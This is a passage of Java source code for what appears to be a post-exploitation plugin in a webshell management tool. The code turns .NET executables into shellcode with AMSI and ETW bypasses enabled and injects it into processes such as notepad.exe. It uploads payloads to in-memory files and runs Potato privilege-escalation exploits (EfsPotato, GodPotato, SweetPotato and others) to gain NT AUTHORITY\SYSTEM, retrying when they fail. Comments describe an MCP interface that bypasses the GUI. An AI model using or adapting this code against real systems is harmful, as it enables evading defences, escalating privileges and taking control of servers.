                         boolean alreadyEnabled = isGlobalElevateEnabled(this.shellEntity);
                         this.markGlobalElevateEnabled();
                         if (!alreadyEnabled) {
                             showElevateSuccessDialog();
                         }
                    }
                } catch (Exception var6) {
                    GOptionPane.showMessageDialog(UiFunction.getParentFrame(this.corePanel), var6.getMessage());
                }
            }
        }
    }

    private byte[] getPayloadAsShellcode(byte[] payload, String args) throws Exception {
        if (payload.length >= 2 && payload[0] == 77 && payload[1] == 90) { // MZ Header
            PE peContext = PEParser.parse(new ByteArrayInputStream(payload));
            if (peContext.getOptionalHeader().getDataDirectory(14).getVirtualAddress() != 0) { // .NET Check
                DotNetGenerateInfo dotNetGenerateInfo = new DotNetGenerateInfo();
                dotNetGenerateInfo.bypassEtw = true;
                dotNetGenerateInfo.bypassAmsi = true;
                dotNetGenerateInfo.isX64 = this.payload.isX64();
                dotNetGenerateInfo.commandLine = args;
                return PeLoader.dotnetPeToShellcode(payload, dotNetGenerateInfo, this.textArea_CmdResult.getPrintStream());
            } else {
                throw new UnsupportedOperationException("\u975e .NET \u7a0b\u5e8f\u96c6");
            }
        }
        return payload; // Assume it's already shellcode
    }

    public byte[] runNetPe(String args, byte[] pe, int readWait, PrintStream printWriter) throws Exception {
        if (pe == null) {
            throw new UnsupportedOperationException("PE \u4e3a\u7a7a");
        } else {
            PE peContext = PEParser.parse(new ByteArrayInputStream(pe));
            if (peContext.getOptionalHeader().getDataDirectory(14).getVirtualAddress() != 0) {
                DotNetGenerateInfo dotNetGenerateInfo = new DotNetGenerateInfo();
                dotNetGenerateInfo.bypassEtw = true;
                dotNetGenerateInfo.bypassAmsi = true;
                dotNetGenerateInfo.isX64 = this.payload.isX64();
                dotNetGenerateInfo.commandLine = args;
                byte[] shellcode = PeLoader.dotnetPeToShellcode(pe, dotNetGenerateInfo, printWriter);
                if (shellcode != null) {
                    byte[] result = this.runShellcode(this.excuteFileComboBox.getSelectedItem().toString(), shellcode, readWait);
                    return result;
                } else {
                    throw new UnsupportedOperationException("PeToShellcode \u5931\u8d25");
                }
            } else {
                throw new UnsupportedOperationException("\u975e .NET \u7a0b\u5e8f\u96c6");
            }
        }
    }

    public byte[] runShellcode(String command, byte[] shellcode, int readWait) {
        return this.runShellcode(new ReqParameter(), command, shellcode, readWait);
    }

    public byte[] runShellcode(ReqParameter reqParameter, String command, byte[] shellcode, int readWait) {
        if (!this.load()) {
            return "\u672a\u80fd\u52a0\u8f7d ShellcodeLoader\uff08include \u5931\u8d25\uff09\u3002\u5f53\u524d\u4f1a\u8bdd\u672a\u52a0\u8f7d\u8be5\u6a21\u5757\uff0c\u8bf7\u5148\u5728 TH_TOOLS \u4e2d\u52a0\u8f7d\u5e76\u786e\u8ba4 JarLoader\u3002".getBytes();
        }
        if (command != null && !command.trim().isEmpty()) {
            reqParameter.add("excuteFile", command);
            reqParameter.add("type", "start");
        } else {
            reqParameter.add("type", "local");
        }

        if (shellcode.length > this.shellEntity.getOnceBigFileUploadByteNum()) {
            String memFile = String.format("mem://%s", UUID.randomUUID().toString());
            boolean uploadFlag;
            if (this.shellEntity.getFrame() != null) {
                uploadFlag = this.shellEntity.getFrame().getShellFileManager().uploadBigFile(memFile, "buf", new ByteArrayInputStream(shellcode));
            } else {
                uploadFlag = mcpUploadBigFile(memFile, shellcode);
            }
            if (!uploadFlag) {
                this.payload.deleteFile(memFile);
                return "Shellcode \u4e0a\u4f20\u5931\u8d25".getBytes();
            }

            reqParameter.add("memfile", memFile);
        } else {
            reqParameter.add("shellcode", shellcode);
        }

        reqParameter.add("readWaitTime", Integer.toString(readWait));
        byte[] result = this.payload.evalFunc(this.getClassName(), "run", reqParameter);
        return result;
    }

    /** MCP 兼容: 绕过 GUI ShellFileManager, 用 payload.bigFileUpload 分片上传到内存文件 */
    private boolean mcpUploadBigFile(String memFile, byte[] data) {
        try {
            int once = this.shellEntity.getOnceBigFileUploadByteNum();
            for (int off = 0; off < data.length; off += once) {
                byte[] chunk = java.util.Arrays.copyOfRange(data, off, Math.min(off + once, data.length));
                String flag = this.payload.bigFileUpload(memFile, (long)off, chunk);
                if (!"ok".equals(flag)) {
                    Log.log("mcpUploadBigFile: fail at " + off + " flag=" + flag);
                    return false;
                }
            }
            return true;
        } catch (Exception e) {
            Log.error(e);
            return false;
        }
    }

    private boolean isElevateSuccess(String resultString) {
        if (resultString == null || resultString.isEmpty()) {
            return false;
        }

        String upper = resultString.toUpperCase(Locale.ENGLISH);
        if (upper.contains("NT AUTHORITY\\SYSTEM") || upper.contains("NT AUTHORITY/SYSTEM") || upper.contains("S-1-5-18")) {
            return true;
        }
        if (upper.contains("NT AUTHORITY") && upper.contains("SYSTEM")) {
            return true;
        }
        // EfsPotato / potato logs often succeed without printing whoami
        return upper.contains("GET TOKEN") && (upper.contains("PROCESS WITH PID") || upper.contains("BINDING OK"));
    }

    /** Avoid GOptionPane/EasyI18N mojibake on GBK/UTF-8 mixed sources. */
    private void showElevateSuccessDialog() {
        javax.swing.JOptionPane.showMessageDialog(
                this.corePanel,
                "\u63d0\u6743\u6210\u529f (NT AUTHORITY\\SYSTEM)",
                "TH_TOOLS",
                javax.swing.JOptionPane.INFORMATION_MESSAGE);
    }

    private void markGlobalElevateEnabled() {
        if (this.shellEntity == null) {
            return;
        }

        this.shellEntity.setEnv(ENV_TH_TOOLS_ELEVATE_ENABLED, "true");
        if (this.CurrentPlugin != null && !this.CurrentPlugin.isEmpty()
                && !PLUGIN_OPTION_NONE.equals(this.CurrentPlugin)) {
            this.shellEntity.setEnv(ENV_TH_TOOLS_POTATO_PLUGIN, this.CurrentPlugin);
        }

        if (this.excuteFileComboBox != null) {
            Object selected = this.excuteFileComboBox.getSelectedItem();
            if (selected != null) {
                this.shellEntity.setEnv(ENV_TH_TOOLS_EXECUTE_FILE, selected.toString());
            }
        }
    }

    public static boolean isGlobalElevateEnabled(ShellEntity shellEntity) {
        if (shellEntity == null) {
            return false;
        }
        return Boolean.parseBoolean(shellEntity.getEnv(ENV_TH_TOOLS_ELEVATE_ENABLED, "false"));
    }

    public static byte[] runPePreferThTools(ShellEntity shellEntity, ShellcodeLoader loader, String args, byte[] pe, int readWait, PrintStream printWriter) throws Exception {
        if (loader == null) {
            throw new IllegalArgumentException("loader is null");
        }

        if (shellEntity != null && isGlobalElevateEnabled(shellEntity)) {
            try {
                Object plugin = shellEntity.getFrame() != null ? shellEntity.getFrame().getPlugin("TH_TOOLS") : null;
                if (plugin instanceof TH_TOOLS) {
                    TH_TOOLS thTools = (TH_TOOLS)plugin;
                    String executeFile = shellEntity.getEnv(ENV_TH_TOOLS_EXECUTE_FILE, (String)null);
                    if (executeFile != null && thTools.excuteFileComboBox != null) {
                        thTools.excuteFileComboBox.setSelectedItem(executeFile);
                    }
                    return runPeWithThTools(thTools, loader, args, pe, readWait, printWriter);
                }
                if (plugin == null && shellEntity.getFrame() == null) {
                    TH_TOOLS thTools = createThToolsInstance(shellEntity);
                    if (thTools != null) {
                        return runPeWithThTools(thTools, loader, args, pe, readWait, printWriter);
                    }
                }
            } catch (Throwable var7) {
            }
        }

        return loader.runPe2(args, pe, readWait);
    }

    /** .NET PE uses runNetPe; native PE uses stock runPe2. */
    private static byte[] runPeWithThTools(TH_TOOLS thTools, ShellcodeLoader loader, String args, byte[] pe, int readWait, PrintStream printWriter) throws Exception {
        try {
            return thTools.runNetPe(args, pe, readWait, printWriter);
        } catch (UnsupportedOperationException ignored) {
            return loader.runPe2(args, pe, readWait);
        }
    }

    public byte[] runNativePeElevated(String args, byte[] pe, int readWait, PrintStream printWriter) throws Exception {
        byte[] shellcode = PeLoader.peToShellcode(pe, printWriter);
        if (shellcode == null || shellcode.length == 0) {
            throw new UnsupportedOperationException("PeToShellcode \u5931\u8d25");
        }
        String potato = this.shellEntity != null
                ? this.shellEntity.getEnv(ENV_TH_TOOLS_POTATO_PLUGIN, this.CurrentPlugin)
                : this.CurrentPlugin;
        if (potato == null || potato.isEmpty() || PLUGIN_OPTION_NONE.equals(potato)) {
            potato = "EfsPotato";
        }
        this.CurrentPlugin = potato;
        PluginInfo info = this.SearchPluginByName(this.CurrentPlugin);
        if (info == null) {
            throw new IllegalStateException("plugin not found: " + potato);
        }
        if (!this.loadPlugin(this.CurrentPlugin)) {
            throw new IllegalStateException("plugin load failed: " + potato);
        }
        String host = this.shellEntity != null ? this.shellEntity.getEnv(ENV_TH_TOOLS_EXECUTE_FILE, (String) null) : null;
        if (host == null || host.isEmpty()) {
            if (this.excuteFileComboBox != null && this.excuteFileComboBox.getSelectedItem() != null) {
                host = this.excuteFileComboBox.getSelectedItem().toString();
            } else {
                host = this.payload != null && this.payload.isX64()
                        ? "C:\\Windows\\System32\\notepad.exe"
                        : "C:\\Windows\\SysWOW64\\notepad.exe";
            }
        }
        if (host.toLowerCase(Locale.ENGLISH).contains("werfault")) {
            host = this.payload != null && this.payload.isX64()
                    ? "C:\\Windows\\System32\\notepad.exe"
                    : "C:\\Windows\\SysWOW64\\notepad.exe";
        }
        String cmd = (args == null || args.trim().isEmpty()) ? host : host + " " + args;
        int wait = readWait < 15000 ? 15000 : readWait;
        this.Excute_cmd = cmd;
        this.shellcodeHex = functions.byteArrayToHex(shellcode);
        ReqParameter parameter = new ReqParameter();
        parameter.add("cmd", cmd);
        parameter.add("shellcode", shellcode);
        parameter.add("readWait", Integer.toString(wait));
        parameter.add("RPCTimeOut", "120000");
        parameter.add("timeout", "120000");
        String name = info.getDisplayName();
        if ("EfsPotato".equals(name)) {
            parameter.add("pipe", "lsarpc");
            parameter.add("exploitMethod", "EfsRpcEncryptFileSrv");
            return this.evalPotatoWithRetry("EfsPotato.Run", parameter);
        }
        if ("BadPotato".equals(name)) {
            return this.evalPotatoWithRetry("BadPotato.Run", parameter);
        }
        if ("GodPotato".equals(name)) {
            return this.evalPotatoWithRetry("GodPotato.Run", parameter);
        }
        if ("SweetPotato".equals(name)) {
            parameter.add("clsid", "4991D34B-80A1-4291-83B6-3328366B9097");
            return this.evalPotatoWithRetry("SweetPotato.Run", parameter);
        }
        if ("PrintNotifyPotato".equals(name)) {
            return this.evalPotatoWithRetry("PrintNotifyPotato.Run", parameter);
        }
        return this.ExeCuteShellcode();
    }

    private byte[] evalPotatoWithRetry(String className, ReqParameter parameter) {
        byte[] last = null;
        for (int i = 0; i < 3; i++) {
            if (i > 0) {
                try {
                    Thread.sleep(2500L);
                } catch (InterruptedException ie) {
                    Thread.currentThread().interrupt();
                    break;
                }
            }
            last = this.payload.evalFunc(className, "run", parameter);
            String text = last == null ? "" : (this.encoding != null ? this.encoding.Decoding(last) : new String(last));
            if (text != null && !text.toLowerCase(Locale.ENGLISH).contains("timed out")) {
                return last;
            }
        }
        return last;
    }

    /** MCP 兼容: 按 shell payload 类型自建 TH_TOOLS 实例 (绕过 GUI frame 依赖) */
    private static TH_TOOLS createThToolsInstance(ShellEntity shellEntity) {
        try {
            String cn = shellEntity.getPayloadModule().getClass().getName();
            String lang = cn.contains("csharp") || cn.contains("netcore") ? "csharp" : "java";
            Class<?> c = Class.forName("shells.plugins." + lang + ".TH_TOOLS");
            TH_TOOLS t = (TH_TOOLS) c.newInstance();
            t.init(shellEntity);
            return t;
        } catch (Throwable t) {
            Log.error(t);
            return null;
        }
    }

    public PluginInfo SearchPluginByName(String PluginName) {
        PluginInfo[] var2 = this.pluginInfos;
        int var3 = var2.length;

        for(int var4 = 0; var4 < var3; ++var4) {
            PluginInfo s = var2[var4];
            if (s.getDisplayName().equals(PluginName)) {
                return s;
            }
        }

        return null;
    }

    public void SetPluginLoadStateByName(String PluginName, boolean LoadState) {
        PluginInfo[] var3 = this.pluginInfos;
        int var4 = var3.length;

        for(int var5 = 0; var5 < var4; ++var5) {
            PluginInfo s = var3[var5];
            if (s.getDisplayName().equals(PluginName)) {
                s.setLoadState(LoadState);
            }
        }

    }

    public void init(ShellEntity shellEntity) {
        this.shellEntity = shellEntity;
        this.payload = this.shellEntity.getPayloadModule();
        this.encoding = Encoding.getEncoding(this.shellEntity);
        automaticBindClick.bindJButtonClick(TH_TOOLS.class, this, TH_TOOLS.class, this);
        this.init_plug();
    }

    public JPanel getView() {
        return this.corePanel;
    }

    protected abstract PluginInfo[] InitPlugInfo();

    public abstract boolean loadPlugin(String var1);

    public abstract String getClassName();

    protected abstract byte[] ExeCuteShellcode();

    protected abstract byte[] ExeCuteCmd();

    public abstract boolean load();

    protected abstract byte[] getPluginByte();
}
